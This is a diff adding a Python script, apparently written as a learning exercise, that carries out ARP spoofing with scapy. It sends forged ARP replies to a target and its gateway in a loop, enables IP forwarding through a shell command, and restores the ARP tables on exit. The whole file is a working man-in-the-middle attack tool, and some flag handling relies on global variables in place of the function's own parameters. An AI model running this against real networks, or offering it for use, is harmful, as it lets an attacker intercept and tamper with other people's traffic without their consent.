@@ -1,0 +1,295 @@
+#!/usr/bin/env python3
+
+import argparse  # Successor of optparse
+import subprocess
+
+import scapy.all as scapy
+import re
+import time
+import sys
+
+
+def check_root_or_not():
+    try:
+        scapy.srp(scapy.Ether(), verbose=False, timeout=0.5)
+    except PermissionError:
+        print("\n[-] Kindly re-run with root privileges.\n")
+        exit(0)
+
+
+def get_args():
+    # Object Initialization of argparse
+    parser = argparse.ArgumentParser()
+
+    # Adding argument options
+    parser.add_argument("-t", "--target", dest="target_ip", help="Target IP to spoof.")
+    parser.add_argument("-g", "--gateway", dest="gateway_ip", help="GateWay IP to spoof as.")
+    parser.add_argument("-nr", "--notrestore", dest="not_restore",
+                        help="To Not Restore IP tables after KeyboardInterrupt. "
+                             + "\nDefault = False.")
+    parser.add_argument("-nl", "--notloop", dest="not_loop", help="To Spoof in loop until KeyboardInterrupt. "
+                                                                  "\nDefault = "
+                                                                  "False. ")
+    parser.add_argument("-nv", "--notverbose", dest="not_verbose",
+                        help="To Execute without output. \nDefault = False. ")
+    parser.add_argument("-s", "--seconds", dest="seconds", help="Interval between packet transmission. \nDefault = 2 "
+                                                                "*seconds*")
+    parser.add_argument("-o", "--oneway", dest="one_way", help="To spoof just one way. \nDefault = False.")
+    parser.add_argument("-npf", "--no-portforwarding", dest="no_portforwarding", help="To not run script to enable "
+                                                                                      "portForwarding on linux if "
+                                                                                      "already not enabled. \nDefault "
+                                                                                      "= False.")
+    # parser.parse_args() is used to parse the entered values.
+
+    # It returns ONLY ONE result, options chosen by the user.
+    # Saved under STRING variables named as we chose above as 'dest' for them,
+    user_input = parser.parse_args()
+
+    if not user_input.target_ip or not user_input.gateway_ip:
+        print("[-] Kindly Re-Run And Specify both, Target IP (-t) and Gateway IP (-g).")
+        exit(0)
+
+    if not check_ip(user_input.target_ip):
+        print("\n[-] Invalid Target IP - " + user_input.target_ip)
+        exit(0)
+
+    if not check_ip(user_input.gateway_ip):
+        print("\n[-] Invalid GateWay IP - " + user_input.gateway_ip)
+        exit(0)
+
+    return user_input
+
+
+def check_ip(ip):
+    ip_extracted = re.search(r"\d{1,3}.\d{1,3}.\d{1,3}.\d{1,3}", ip)  # Checking value of ip.
+
+    if not ip_extracted:
+        return False
+    try:
+        if ip_extracted[0] != ip:
+            return False
+    except TypeError:
+        pass
+
+    {  # if not ip_extracted:
+        #     print("\n[-] Invalid IP - " + ip)
+        #     exit(0)
+
+        # try:
+        #     if ip_extracted[0] != ip:
+        #         print("\n[-] Invalid IP - " + ip)
+        #         exit(0)
+        # except TypeError:
+        #     pass
+    }
+
+    return True
+
+
+def get_mac(ip):
+    if not check_ip(ip):
+        print("\n[-] Invalid IP - " + ip)
+        exit(0)
+
+    try:  # Catching error due to Invalid IP.
+        arp_request = scapy.ARP(pdst=ip)  # pdst is variable that stores value of ip address to be broadcast.
+    except scapy.socket.gaierror:
+        arp_request = None
+        print("[-] Invalid IP - " + ip)
+        exit(0)
+
+    broadcast = scapy.Ether()
+
+    #    scapy.ls(scapy.Ether())
+    broadcast.dst = 'ff:ff:ff:ff:ff:ff'  # dst = Destination MAC, It figures our MAC as src on its own ;p
+
+    arp_request_broadcast = broadcast / arp_request  # '/' Here is used to combine two packets as scapy ALLOWS it XD
+
+    while True:
+        try:
+            try:
+                answered_list = scapy.srp(arp_request_broadcast, verbose=False, timeout=2)[0]
+                if answered_list is not None:
+                    mac = answered_list[0][1].hwsrc  # Returns MAC of first element '0' in answered list.
+                    # Remember each element in the answered_list is a couple that contains a SENT request,
+                    # and a RECEIVED Response. We use '[1]' to access the response packet received by us,
+                    # of first element i.e., '[0]' Then we take the 'hwsrc' i.e., MAC of where that response packet
+                    # came from. :D
+                    break
+                else:
+                    mac = None
+                    print("\n[-] No client found on the network at ip - " + ip)
+                    exit(0)
+            except KeyboardInterrupt:
+                print("\n[-] Abruptly Exiting on KeyboardInterrupt...")
+                exit(0)
+        except IndexError:
+            pass
+            # mac = None
+            # print("\n [-] Failed to Find MAC Address for IP --> " + ip)
+            # exit(0)
+
+    # Useful Comments.
+    {
+
+        #     scapy.ls(scapy.ARP())
+        #     scapy.ls() is used to list arguments that can be passed in the Class which is passed in it as argument.
+        #     scapy.ls(scapy.ARP())  tells what arguments are accepted by scapy.ARP()
+        # scapy.ARP() is a class that allows us to send ARP requests ;)
+
+        # print("[+] arp_request.summary() \n" + arp_request.summary())
+        # print("[+] Calling arp_request.show()")
+        # arp_request.show()  # show() method lists details of the type of packet it is called from ;D
+
+        # scapy.Ether() is a class that allows us to create an Ethernet frame where we actually broadcast the ARP Req.
+        # It sends The ARP Req to all MAC ADDRESSES so that they can receive it and send their response! :D
+
+        # Above MAC (ff:ff:ff:ff:ff:ff) is actually a NULL MAC which means it'll be broadcast to all devices. :D
+
+        # print("[+] broadcast.summary() \n" + broadcast.summary())
+        # print("[+] Calling broadcast.show()")
+        # broadcast.show()  # show() method lists details of the type of packet it is called from ;D
+
+        # Combining arp_request (ARP packet) and broadcast (MAC Address Packet) into one :D
+
+        # print("[+} arp_request_broadcast.summary() \n" + arp_request_broadcast.summary())
+        #
+        # print("[+] Calling arp_request_broadcast.show()")
+        # arp_request_broadcast.show()  # show() method lists details of the type of packet it is called from ;D
+
+        #  Onto Sending and Receiving Packets ;D
+        # (answered_list, unanswered_list) = scapy.srp(arp_request_broadcast, timeout=1)
+        # scapy.srp() returns two lists - answered_list and unanswered_list
+
+        # Modifying stuff to only receive answered list cos we don't need unanswered list.
+
+        # verbose=False removes unnecessary Console Output.
+        # [0] here specifies that we need only FIRST Element and not the second returning element of the function
+
+        # print("[+] answered_list.summary()")
+        # print(answered_list.summary())
+
+        # print("[+] unanswered_list.summary()")
+        # print(unanswered_list.summary())
+
+    }
+
+    return mac  # Returning MAC address of the IP passed as argument. :)
+
+
+def spoof(target_ip, spoof_ip, spoof_both_ways=None):
+    packet = scapy.ARP(op=2)  # 'op' is the type of packet or the operation assigned to it. :)
+    # We use '2' here instead of (default) '1' because we want the packet to be an ARP RESPONSE packet.
+
+    mac_target = get_mac(target_ip)  # Getting MAC of target_ip using in-house get_mac() function.
+
+    packet.pdst = target_ip  # IP where packet is sent.
+    packet.hwdst = mac_target  # MAC where packet will be sent.
+    packet.psrc = spoof_ip  # The IP we are Pretending to be in front of our Target!
+
+    # packet.show()  # Prints Packet Details
+    # print(packet.summary())  # Prints what the Packet is trying to Say! Or Do XD
+
+    scapy.send(packet, verbose=0)  # Simply sends the packet passed in arguments without any console output! :D
+    if spoof_both_ways:
+        spoof(spoof_ip, target_ip)
+
+
+def restore(src_ip, dst_ip, restore_both_ways=None):
+    # Details of the internal working of restore() are similar to spoof() above.
+    # Refer to spoof() for more detailed information
+
+    src_mac = get_mac(src_ip)
+    dst_mac = get_mac(dst_ip)
+
+    packet = scapy.ARP(op=2, pdst=dst_ip, hwdst=dst_mac, psrc=src_ip, hwsrc=src_mac)
+    # 'op=2' clarifies packet to be an ARP Response.
+    # We use 'psrc=src_ip' to tell device at 'dst_ip' and at address 'dst_mac' that 'src_ip'
+    # is at the correct mac of 'src_ip' to correct the IP tables :)
+
+    scapy.send(packet, count=4, verbose=False)  # Sending the packet. '4' times or counts ;)
+
+    if restore_both_ways:  # If BothWays then restore both ways too! :D
+        restore(dst_ip, src_ip)
+
+
+def arp_spoof(target_ip, spoof_ip, spoof_both_ways=False, is_verbose=True, if_restore=True, sleep=2, on_loop=False):
+    sent_packet_count = 0
+    if verbose:
+        if on_loop:
+            print("\n[*] Initiating Spoofing on Loop...")
+        else:
+            print("\n[*] Initiating Spoofing for Once...")
+
+        if spoof_both_ways:
+            print("[+] Target IP --> '" + target_ip + "' and Gateway IP --> '" + spoof_ip + "'. (Both-Ways = True)\n")
+        else:
+            print("[+] Target IP --> '" + target_ip + "' and Gateway IP --> '" + spoof_ip + "'. (Both-Ways = False)\n")
+
+    try:
+        while True:
+            spoof(target_ip, spoof_ip, spoof_both_ways=spoof_both_ways)
+            sent_packet_count = sent_packet_count + 1
+
+            if both_ways:
+                output = "\r[+] Packets sent : " + str(
+                    sent_packet_count * 2) + "\t\t\t" + "(Timeout=" + str(sleep) + "s)" + "\t\t"
+            else:
+                output = "\r[+] Packets sent : " + str(sent_packet_count) + "\t\t\t" \
+                         + "(Timeout=" + str(sleep) + "s)" + "\t\t"
+
+            # To make code executable in python3 and lower versions Both :- :D
+            # 'end' argument isn't supported in python2, but is in python3.
+
+            if int(sys.version[0]) > 2:  # sys.version is used to get version of python, while [0] gets the first digit.
+                exec("print(output, end=\" \") ")  # We use '\"' to use Double Quotes within Double Quotes. XDXD
+                # Let there be redundant parenthesis ( exec() ), else it won't work in python3.
+            else:
+                print(output),  # ',' forces line to not change, but keeps output in buffer rather than printing it.
+                sys.stdout.flush()  # This tells python to flush the buffer and show the output.
+
+            # '\r' over rides current output in current line, and prints afresh on the same line. ;)
+
+            if on_loop:
+                time.sleep(sleep)
+            else:
+                break
+    except KeyboardInterrupt:
+        pass
+    if is_verbose:
+        print("\n\n[-] Operation Terminated.")
+
+        if if_restore:
+            print("[*] Restoring Arp Tables Back to Normal.\n")
+    else:
+        pass
+
+    if if_restore:
+        restore(target_ip, spoof_ip, restore_both_ways=spoof_both_ways)
+
+
+check_root_or_not()
+
+# Variables ;p
+args = get_args()
+both_ways = False if args.one_way else True
+verbose = False if args.not_verbose else True
+ip_target = args.target_ip
+ip_spoof = args.gateway_ip
+restore_if = False if args.not_restore else True
+loop = False if args.not_loop else True
+
+if args.no_portforwarding:
+    pass
+else:
+    subprocess.call("echo '1' > /proc/sys/net/ipv4/ip_forward", shell=True)
+    if verbose:
+        print("\n[+] PortForwarding Enabled. :)\n")
+
+try:
+    seconds = int(args.seconds) if args.seconds else 2
+except ValueError:
+    seconds = 2
+
+arp_spoof(ip_target, ip_spoof, is_verbose=verbose, if_restore=restore_if, spoof_both_ways=both_ways,
+          sleep=seconds, on_loop=loop)
